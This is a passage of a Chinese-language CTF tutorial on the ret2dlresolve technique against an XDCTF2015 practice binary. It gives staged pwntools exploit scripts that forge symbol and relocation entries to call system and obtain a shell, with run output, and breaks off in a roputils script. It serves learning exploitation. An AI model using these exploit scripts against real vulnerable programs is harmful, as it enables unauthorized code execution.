class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">elf = ELF(<span class=\"string\">&#x27;main&#x27;</span>)</span><br><span class=\"line\">r = process(<span class=\"string\">&#x27;./main&#x27;</span>)</span><br><span class=\"line\">rop = ROP(<span class=\"string\">&#x27;./main&#x27;</span>)</span><br><span class=\"line\">offset = <span class=\"number\">112</span></span><br><span class=\"line\">bss_addr = elf.bss()</span><br><span class=\"line\">r.recvuntil(<span class=\"string\">&#x27;Welcome to XDCTF2015~!\\n&#x27;</span>)</span><br><span class=\"line\"><span class=\"comment\">## stack privot to bss segment</span></span><br><span class=\"line\"><span class=\"comment\">## new stack size is 0x800</span></span><br><span class=\"line\">stack_size = <span class=\"number\">0x800</span></span><br><span class=\"line\">base_stage = bss_addr + stack_size</span><br><span class=\"line\"><span class=\"comment\">### padding</span></span><br><span class=\"line\">rop.raw(<span class=\"string\">&#x27;a&#x27;</span> * offset)</span><br><span class=\"line\"><span class=\"comment\">### read 100 byte to base_stage</span></span><br><span class=\"line\">rop.read(<span class=\"number\">0</span>, base_stage, <span class=\"number\">100</span>)</span><br><span class=\"line\"><span class=\"comment\">### stack privot, set esp = base_stage</span></span><br><span class=\"line\">rop.migrate(base_stage)</span><br><span class=\"line\">r.sendline(rop.chain())</span><br><span class=\"line\"><span class=\"comment\">## write sh=&quot;/bin/sh&quot;</span></span><br><span class=\"line\">rop = ROP(<span class=\"string\">&#x27;./main&#x27;</span>)</span><br><span class=\"line\">sh = <span class=\"string\">&quot;/bin/sh&quot;</span></span><br><span class=\"line\">plt0 = elf.get_section_by_name(<span class=\"string\">&#x27;.plt&#x27;</span>).header.sh_addr</span><br><span class=\"line\">rel_plt = elf.get_section_by_name(<span class=\"string\">&#x27;.rel.plt&#x27;</span>).header.sh_addr</span><br><span class=\"line\">dynsym = elf.get_section_by_name(<span class=\"string\">&#x27;.dynsym&#x27;</span>).header.sh_addr</span><br><span class=\"line\">dynstr = elf.get_section_by_name(<span class=\"string\">&#x27;.dynstr&#x27;</span>).header.sh_addr</span><br><span class=\"line\"><span class=\"comment\">### making fake write symbol</span></span><br><span class=\"line\">fake_sym_addr = base_stage + <span class=\"number\">32</span></span><br><span class=\"line\">align = <span class=\"number\">0x10</span> - ((fake_sym_addr - dynsym) &amp; <span class=\"number\">0xf</span></span><br><span class=\"line\">                )  <span class=\"comment\"># since the size of item(Elf32_Symbol) of dynsym is 0x10</span></span><br><span class=\"line\">fake_sym_addr = fake_sym_addr + align</span><br><span class=\"line\">index_dynsym = (</span><br><span class=\"line\">    fake_sym_addr - dynsym) / <span class=\"number\">0x10</span>  <span class=\"comment\"># calculate the dynsym index of write</span></span><br><span class=\"line\">fake_write_sym = flat([<span class=\"number\">0x4c</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0x12</span>])</span><br><span class=\"line\"><span class=\"comment\">### making fake write relocation</span></span><br><span class=\"line\"><span class=\"comment\">## making base_stage+24 ---&gt; fake reloc</span></span><br><span class=\"line\">index_offset = base_stage + <span class=\"number\">24</span> - rel_plt</span><br><span class=\"line\">write_got = elf.got[<span class=\"string\">&#x27;write&#x27;</span>]</span><br><span class=\"line\">r_info = (index_dynsym &lt;&lt; <span class=\"number\">8</span>) | <span class=\"number\">0x7</span></span><br><span class=\"line\">fake_write_reloc = flat([write_got, r_info])</span><br><span class=\"line\">rop.raw(plt0)</span><br><span class=\"line\">rop.raw(index_offset)</span><br><span class=\"line\"><span class=\"comment\">## fake ret addr of write</span></span><br><span class=\"line\">rop.raw(<span class=\"string\">&#x27;bbbb&#x27;</span>)</span><br><span class=\"line\">rop.raw(<span class=\"number\">1</span>)</span><br><span class=\"line\">rop.raw(base_stage + <span class=\"number\">80</span>)</span><br><span class=\"line\">rop.raw(<span class=\"built_in\">len</span>(sh))</span><br><span class=\"line\">rop.raw(fake_write_reloc)  <span class=\"comment\"># fake write reloc</span></span><br><span class=\"line\">rop.raw(<span class=\"string\">&#x27;a&#x27;</span> * align)  <span class=\"comment\"># padding</span></span><br><span class=\"line\">rop.raw(fake_write_sym)  <span class=\"comment\"># fake write symbol</span></span><br><span class=\"line\">rop.raw(<span class=\"string\">&#x27;a&#x27;</span> * (<span class=\"number\">80</span> - <span class=\"built_in\">len</span>(rop.chain())))</span><br><span class=\"line\">rop.raw(sh)</span><br><span class=\"line\">rop.raw(<span class=\"string\">&#x27;a&#x27;</span> * (<span class=\"number\">100</span> - <span class=\"built_in\">len</span>(rop.chain())))</span><br><span class=\"line\">r.sendline(rop.chain())</span><br><span class=\"line\">r.interactive()</span><br></pre></td></tr></table></figure>\n\n<p>具体效果如下</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">➜  ret2dlresolve git:(master) ✗ python stage4.py</span><br><span class=\"line\">[*] &#x27;/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/stackoverflow/example/ret2dlresolve/main&#x27;</span><br><span class=\"line\">    Arch:     i386-32-little</span><br><span class=\"line\">    RELRO:    Partial RELRO</span><br><span class=\"line\">    Stack:    No canary found</span><br><span class=\"line\">    NX:       NX enabled</span><br><span class=\"line\">    PIE:      No PIE (0x8048000)</span><br><span class=\"line\">[+] Starting local process &#x27;./main&#x27;: pid 128795</span><br><span class=\"line\">[*] Loaded cached gadgets for &#x27;./main&#x27;</span><br><span class=\"line\">[*] Switching to interactive mode</span><br><span class=\"line\">/bin/sh[*] Got EOF while reading in interactive</span><br></pre></td></tr></table></figure>\n\n<p><strong>stage 5</strong></p>\n<p>这一阶段，我们将在阶段4的基础上，我们进一步使得write符号的st_name指向我们自己构造的字符串。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">elf = ELF(<span class=\"string\">&#x27;main&#x27;</span>)</span><br><span class=\"line\">r = process(<span class=\"string\">&#x27;./main&#x27;</span>)</span><br><span class=\"line\">rop = ROP(<span class=\"string\">&#x27;./main&#x27;</span>)</span><br><span class=\"line\">offset = <span class=\"number\">112</span></span><br><span class=\"line\">bss_addr = elf.bss()</span><br><span class=\"line\">r.recvuntil(<span class=\"string\">&#x27;Welcome to XDCTF2015~!\\n&#x27;</span>)</span><br><span class=\"line\"><span class=\"comment\">## stack privot to bss segment</span></span><br><span class=\"line\"><span class=\"comment\">## new stack size is 0x800</span></span><br><span class=\"line\">stack_size = <span class=\"number\">0x800</span></span><br><span class=\"line\">base_stage = bss_addr + stack_size</span><br><span class=\"line\"><span class=\"comment\">### padding</span></span><br><span class=\"line\">rop.raw(<span class=\"string\">&#x27;a&#x27;</span> * offset)</span><br><span class=\"line\"><span class=\"comment\">### read 100 byte to base_stage</span></span><br><span class=\"line\">rop.read(<span class=\"number\">0</span>, base_stage, <span class=\"number\">100</span>)</span><br><span class=\"line\"><span class=\"comment\">### stack privot, set esp = base_stage</span></span><br><span class=\"line\">rop.migrate(base_stage)</span><br><span class=\"line\">r.sendline(rop.chain())</span><br><span class=\"line\"><span class=\"comment\">## write sh=&quot;/bin/sh&quot;</span></span><br><span class=\"line\">rop = ROP(<span class=\"string\">&#x27;./main&#x27;</span>)</span><br><span class=\"line\">sh = <span class=\"string\">&quot;/bin/sh&quot;</span></span><br><span class=\"line\">plt0 = elf.get_section_by_name(<span class=\"string\">&#x27;.plt&#x27;</span>).header.sh_addr</span><br><span class=\"line\">rel_plt = elf.get_section_by_name(<span class=\"string\">&#x27;.rel.plt&#x27;</span>).header.sh_addr</span><br><span class=\"line\">dynsym = elf.get_section_by_name(<span class=\"string\">&#x27;.dynsym&#x27;</span>).header.sh_addr</span><br><span class=\"line\">dynstr = elf.get_section_by_name(<span class=\"string\">&#x27;.dynstr&#x27;</span>).header.sh_addr</span><br><span class=\"line\"><span class=\"comment\">### making fake write symbol</span></span><br><span class=\"line\">fake_sym_addr = base_stage + <span class=\"number\">32</span></span><br><span class=\"line\">align = <span class=\"number\">0x10</span> - ((fake_sym_addr - dynsym) &amp; <span class=\"number\">0xf</span></span><br><span class=\"line\">                )  <span class=\"comment\"># since the size of item(Elf32_Symbol) of dynsym is 0x10</span></span><br><span class=\"line\">fake_sym_addr = fake_sym_addr + align</span><br><span class=\"line\">index_dynsym = (</span><br><span class=\"line\">    fake_sym_addr - dynsym) / <span class=\"number\">0x10</span>  <span class=\"comment\"># calculate the dynsym index of write</span></span><br><span class=\"line\"><span class=\"comment\">## plus 10 since the size of Elf32_Sym is 16.</span></span><br><span class=\"line\">st_name = fake_sym_addr + <span class=\"number\">0x10</span> - dynstr</span><br><span class=\"line\">fake_write_sym = flat([st_name, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0x12</span>])</span><br><span class=\"line\"><span class=\"comment\">### making fake write relocation</span></span><br><span class=\"line\"><span class=\"comment\">## making base_stage+24 ---&gt; fake reloc</span></span><br><span class=\"line\">index_offset = base_stage + <span class=\"number\">24</span> - rel_plt</span><br><span class=\"line\">write_got = elf.got[<span class=\"string\">&#x27;write&#x27;</span>]</span><br><span class=\"line\">r_info = (index_dynsym &lt;&lt; <span class=\"number\">8</span>) | <span class=\"number\">0x7</span></span><br><span class=\"line\">fake_write_reloc = flat([write_got, r_info])</span><br><span class=\"line\">rop.raw(plt0)</span><br><span class=\"line\">rop.raw(index_offset)</span><br><span class=\"line\"><span class=\"comment\">## fake ret addr of write</span></span><br><span class=\"line\">rop.raw(<span class=\"string\">&#x27;bbbb&#x27;</span>)</span><br><span class=\"line\">rop.raw(<span class=\"number\">1</span>)</span><br><span class=\"line\">rop.raw(base_stage + <span class=\"number\">80</span>)</span><br><span class=\"line\">rop.raw(<span class=\"built_in\">len</span>(sh))</span><br><span class=\"line\">rop.raw(fake_write_reloc)  <span class=\"comment\"># fake write reloc</span></span><br><span class=\"line\">rop.raw(<span class=\"string\">&#x27;a&#x27;</span> * align)  <span class=\"comment\"># padding</span></span><br><span class=\"line\">rop.raw(fake_write_sym)  <span class=\"comment\"># fake write symbol</span></span><br><span class=\"line\">rop.raw(<span class=\"string\">&#x27;write\\x00&#x27;</span>)  <span class=\"comment\"># there must be a \\x00 to mark the end of string</span></span><br><span class=\"line\">rop.raw(<span class=\"string\">&#x27;a&#x27;</span> * (<span class=\"number\">80</span> - <span class=\"built_in\">len</span>(rop.chain())))</span><br><span class=\"line\">rop.raw(sh)</span><br><span class=\"line\">rop.raw(<span class=\"string\">&#x27;a&#x27;</span> * (<span class=\"number\">100</span> - <span class=\"built_in\">len</span>(rop.chain())))</span><br><span class=\"line\">r.sendline(rop.chain())</span><br><span class=\"line\">r.interactive()</span><br></pre></td></tr></table></figure>\n\n<p>效果如下</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">➜  ret2dlresolve git:(master) ✗ python stage5.py      </span><br><span class=\"line\">[*] &#x27;/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/stackoverflow/example/ret2dlresolve/main&#x27;</span><br><span class=\"line\">    Arch:     i386-32-little</span><br><span class=\"line\">    RELRO:    Partial RELRO</span><br><span class=\"line\">    Stack:    No canary found</span><br><span class=\"line\">    NX:       NX enabled</span><br><span class=\"line\">    PIE:      No PIE (0x8048000)</span><br><span class=\"line\">[+] Starting local process &#x27;./main&#x27;: pid 129249</span><br><span class=\"line\">[*] Loaded cached gadgets for &#x27;./main&#x27;</span><br><span class=\"line\">[*] Switching to interactive mode</span><br><span class=\"line\">/bin/sh[*] Got EOF while reading in interactive</span><br></pre></td></tr></table></figure>\n\n<p><strong>stage 6</strong></p>\n<p>这一阶段，我们只需要将原先的write字符串修改为system字符串，同时修改write的参数为system的参数即可获取shell。这是因为，dl_resolve最终依赖的是我们所给定的字符串，即使我们给了一个假的字符串它仍然会去解析并执行。具体代码如下</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">elf = ELF(<span class=\"string\">&#x27;main&#x27;</span>)</span><br><span class=\"line\">r = process(<span class=\"string\">&#x27;./main&#x27;</span>)</span><br><span class=\"line\">rop = ROP(<span class=\"string\">&#x27;./main&#x27;</span>)</span><br><span class=\"line\">offset = <span class=\"number\">112</span></span><br><span class=\"line\">bss_addr = elf.bss()</span><br><span class=\"line\">r.recvuntil(<span class=\"string\">&#x27;Welcome to XDCTF2015~!\\n&#x27;</span>)</span><br><span class=\"line\"><span class=\"comment\">## stack privot to bss segment</span></span><br><span class=\"line\"><span class=\"comment\">## new stack size is 0x800</span></span><br><span class=\"line\">stack_size = <span class=\"number\">0x800</span></span><br><span class=\"line\">base_stage = bss_addr + stack_size</span><br><span class=\"line\"><span class=\"comment\">### padding</span></span><br><span class=\"line\">rop.raw(<span class=\"string\">&#x27;a&#x27;</span> * offset)</span><br><span class=\"line\"><span class=\"comment\">### read 100 byte to base_stage</span></span><br><span class=\"line\">rop.read(<span class=\"number\">0</span>, base_stage, <span class=\"number\">100</span>)</span><br><span class=\"line\"><span class=\"comment\">### stack privot, set esp = base_stage</span></span><br><span class=\"line\">rop.migrate(base_stage)</span><br><span class=\"line\">r.sendline(rop.chain())</span><br><span class=\"line\"><span class=\"comment\">## write sh=&quot;/bin/sh&quot;</span></span><br><span class=\"line\">rop = ROP(<span class=\"string\">&#x27;./main&#x27;</span>)</span><br><span class=\"line\">sh = <span class=\"string\">&quot;/bin/sh&quot;</span></span><br><span class=\"line\">plt0 = elf.get_section_by_name(<span class=\"string\">&#x27;.plt&#x27;</span>).header.sh_addr</span><br><span class=\"line\">rel_plt = elf.get_section_by_name(<span class=\"string\">&#x27;.rel.plt&#x27;</span>).header.sh_addr</span><br><span class=\"line\">dynsym = elf.get_section_by_name(<span class=\"string\">&#x27;.dynsym&#x27;</span>).header.sh_addr</span><br><span class=\"line\">dynstr = elf.get_section_by_name(<span class=\"string\">&#x27;.dynstr&#x27;</span>).header.sh_addr</span><br><span class=\"line\"><span class=\"comment\">### making fake write symbol</span></span><br><span class=\"line\">fake_sym_addr = base_stage + <span class=\"number\">32</span></span><br><span class=\"line\">align = <span class=\"number\">0x10</span> - ((fake_sym_addr - dynsym) &amp; <span class=\"number\">0xf</span></span><br><span class=\"line\">                )  <span class=\"comment\"># since the size of item(Elf32_Symbol) of dynsym is 0x10</span></span><br><span class=\"line\">fake_sym_addr = fake_sym_addr + align</span><br><span class=\"line\">index_dynsym = (</span><br><span class=\"line\">    fake_sym_addr - dynsym) / <span class=\"number\">0x10</span>  <span class=\"comment\"># calculate the dynsym index of write</span></span><br><span class=\"line\"><span class=\"comment\">## plus 10 since the size of Elf32_Sym is 16.</span></span><br><span class=\"line\">st_name = fake_sym_addr + <span class=\"number\">0x10</span> - dynstr</span><br><span class=\"line\">fake_write_sym = flat([st_name, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0x12</span>])</span><br><span class=\"line\"><span class=\"comment\">### making fake write relocation</span></span><br><span class=\"line\"><span class=\"comment\">## making base_stage+24 ---&gt; fake reloc</span></span><br><span class=\"line\">index_offset = base_stage + <span class=\"number\">24</span> - rel_plt</span><br><span class=\"line\">write_got = elf.got[<span class=\"string\">&#x27;write&#x27;</span>]</span><br><span class=\"line\">r_info = (index_dynsym &lt;&lt; <span class=\"number\">8</span>) | <span class=\"number\">0x7</span></span><br><span class=\"line\">fake_write_reloc = flat([write_got, r_info])</span><br><span class=\"line\">rop.raw(plt0)</span><br><span class=\"line\">rop.raw(index_offset)</span><br><span class=\"line\"><span class=\"comment\">## fake ret addr of write</span></span><br><span class=\"line\">rop.raw(<span class=\"string\">&#x27;bbbb&#x27;</span>)</span><br><span class=\"line\">rop.raw(base_stage + <span class=\"number\">82</span>)</span><br><span class=\"line\">rop.raw(<span class=\"string\">&#x27;bbbb&#x27;</span>)</span><br><span class=\"line\">rop.raw(<span class=\"string\">&#x27;bbbb&#x27;</span>)</span><br><span class=\"line\">rop.raw(fake_write_reloc)  <span class=\"comment\"># fake write reloc</span></span><br><span class=\"line\">rop.raw(<span class=\"string\">&#x27;a&#x27;</span> * align)  <span class=\"comment\"># padding</span></span><br><span class=\"line\">rop.raw(fake_write_sym)  <span class=\"comment\"># fake write symbol</span></span><br><span class=\"line\">rop.raw(<span class=\"string\">&#x27;system\\x00&#x27;</span>)  <span class=\"comment\"># there must be a \\x00 to mark the end of string</span></span><br><span class=\"line\">rop.raw(<span class=\"string\">&#x27;a&#x27;</span> * (<span class=\"number\">80</span> - <span class=\"built_in\">len</span>(rop.chain())))</span><br><span class=\"line\"><span class=\"built_in\">print</span> rop.dump()</span><br><span class=\"line\"><span class=\"built_in\">print</span> <span class=\"built_in\">len</span>(rop.chain())</span><br><span class=\"line\">rop.raw(sh + <span class=\"string\">&#x27;\\x00&#x27;</span>)</span><br><span class=\"line\">rop.raw(<span class=\"string\">&#x27;a&#x27;</span> * (<span class=\"number\">100</span> - <span class=\"built_in\">len</span>(rop.chain())))</span><br><span class=\"line\">r.sendline(rop.chain())</span><br><span class=\"line\">r.interactive()</span><br></pre></td></tr></table></figure>\n\n<p>需要注意的是，这里我’/bin/sh’的偏移我修改为了82，这是因为pwntools中它会自动帮你对齐字符串。。。下面这一行说明了问题。</p>\n<p>0x0050:      ‘aara’</p>\n<p>效果如下</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">➜  ret2dlresolve git:(master) ✗ python stage6.py</span><br><span class=\"line\">[*] <span class=\"string\">&#x27;/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/stackoverflow/example/ret2dlresolve/main&#x27;</span></span><br><span class=\"line\">    Arch:     i386-<span class=\"number\">32</span>-little</span><br><span class=\"line\">    RELRO:    Partial RELRO</span><br><span class=\"line\">    Stack:    No canary found</span><br><span class=\"line\">    NX:       NX enabled</span><br><span class=\"line\">    PIE:      No PIE (<span class=\"number\">0x8048000</span>)</span><br><span class=\"line\">[+] Starting local process <span class=\"string\">&#x27;./main&#x27;</span>: pid <span class=\"number\">130415</span></span><br><span class=\"line\">[*] Loaded cached gadgets <span class=\"keyword\">for</span> <span class=\"string\">&#x27;./main&#x27;</span></span><br><span class=\"line\"><span class=\"number\">0x0000</span>:        <span class=\"number\">0x8048380</span></span><br><span class=\"line\"><span class=\"number\">0x0004</span>:           <span class=\"number\">0x2528</span></span><br><span class=\"line\"><span class=\"number\">0x0008</span>:           <span class=\"string\">&#x27;bbbb&#x27;</span> <span class=\"string\">&#x27;bbbb&#x27;</span></span><br><span class=\"line\"><span class=\"number\">0x000c</span>:        <span class=\"number\">0x804a892</span></span><br><span class=\"line\"><span class=\"number\">0x0010</span>:           <span class=\"string\">&#x27;bbbb&#x27;</span> <span class=\"string\">&#x27;bbbb&#x27;</span></span><br><span class=\"line\"><span class=\"number\">0x0014</span>:           <span class=\"string\">&#x27;bbbb&#x27;</span> <span class=\"string\">&#x27;bbbb&#x27;</span></span><br><span class=\"line\"><span class=\"number\">0x0018</span>: <span class=\"string\">&#x27;\\x1c\\xa0\\x04\\x08&#x27;</span> <span class=\"string\">&#x27;\\x1c\\xa0\\x04\\x08\\x07i\\x02\\x00&#x27;</span></span><br><span class=\"line\"><span class=\"number\">0x001c</span>:  <span class=\"string\">&#x27;\\x07i\\x02\\x00&#x27;</span></span><br><span class=\"line\"><span class=\"number\">0x0020</span>:           <span class=\"string\">&#x27;aaaa&#x27;</span> <span class=\"string\">&#x27;aaaaaaaa&#x27;</span></span><br><span class=\"line\"><span class=\"number\">0x0024</span>:           <span class=\"string\">&#x27;aaaa&#x27;</span></span><br><span class=\"line\"><span class=\"number\">0x0028</span>:  <span class=\"string\">&#x27;\\x00&amp;\\x00\\x00&#x27;</span> <span class=\"string\">&#x27;\\x00&amp;\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x12\\x00\\x00\\x00&#x27;</span></span><br><span class=\"line\"><span class=\"number\">0x002c</span>: <span class=\"string\">&#x27;\\x00\\x00\\x00\\x00&#x27;</span></span><br><span class=\"line\"><span class=\"number\">0x0030</span>: <span class=\"string\">&#x27;\\x00\\x00\\x00\\x00&#x27;</span></span><br><span class=\"line\"><span class=\"number\">0x0034</span>: <span class=\"string\">&#x27;\\x12\\x00\\x00\\x00&#x27;</span></span><br><span class=\"line\"><span class=\"number\">0x0038</span>:           <span class=\"string\">&#x27;syst&#x27;</span> <span class=\"string\">&#x27;system\\x00&#x27;</span></span><br><span class=\"line\"><span class=\"number\">0x003c</span>:        <span class=\"string\">&#x27;em\\x00o&#x27;</span></span><br><span class=\"line\"><span class=\"number\">0x0040</span>:             <span class=\"string\">&#x27;aa&#x27;</span></span><br><span class=\"line\"><span class=\"number\">0x0044</span>:           <span class=\"string\">&#x27;aaaa&#x27;</span> <span class=\"string\">&#x27;aaaaaaaaaaaaaa&#x27;</span></span><br><span class=\"line\"><span class=\"number\">0x0048</span>:           <span class=\"string\">&#x27;aaaa&#x27;</span></span><br><span class=\"line\"><span class=\"number\">0x004c</span>:           <span class=\"string\">&#x27;aaaa&#x27;</span></span><br><span class=\"line\"><span class=\"number\">0x0050</span>:           <span class=\"string\">&#x27;aara&#x27;</span></span><br><span class=\"line\"><span class=\"number\">82</span></span><br><span class=\"line\">[*] Switching to interactive mode</span><br><span class=\"line\">/<span class=\"built_in\">bin</span>/sh: <span class=\"number\">1</span>: xa: <span class=\"keyword\">not</span> found</span><br><span class=\"line\">$ ls</span><br><span class=\"line\">core  main.c     stage2.py  stage4.py  stage6.py</span><br><span class=\"line\">main  stage1.py  stage3.py  stage5.py</span><br></pre></td></tr></table></figure>\n\n<p><strong>工具攻击</strong></p>\n<p>根据上面的介绍，我们应该很容易可以理解这个攻击了。下面我们直接使用roputil来进行攻击。代码如下</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> roputils <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> process</span><br><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> gdb</span><br><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> context</span><br><span class=\"line\">r = process(<span class=\"string\">&#x27;./main&#x27;</span>)</span><br><span class=\"line\">context.log_level = <span class=\"string\">&#x27;debug&#x27;</span></span><br><span class=\"line\">r.recv()</span><br><span class=\"line\">rop = ROP(<span class=\"string\">&#x27;./main&#x27;</span>)</span><br><span class=\"line\">offset = <span class=\"number\">112</span></span><br><span class=\"line\">bss_base = rop.section(<span class=\"string\">&#x27;.bss&#x27;</span>)</span><br><span class=\"line\">buf = rop.fill(offset)</span><br><span class=\"line\">buf += rop.call(<span class=\"string\">&#x27;read&#x27;</span>, <span class=\"number\">0</span>, bss_base, <span class=\"number\">100</span>)</span><br><span class=\"line\"><span class=\"comment\">## used to call dl_Resolve()</span></span><br><span class=\"line\">buf += 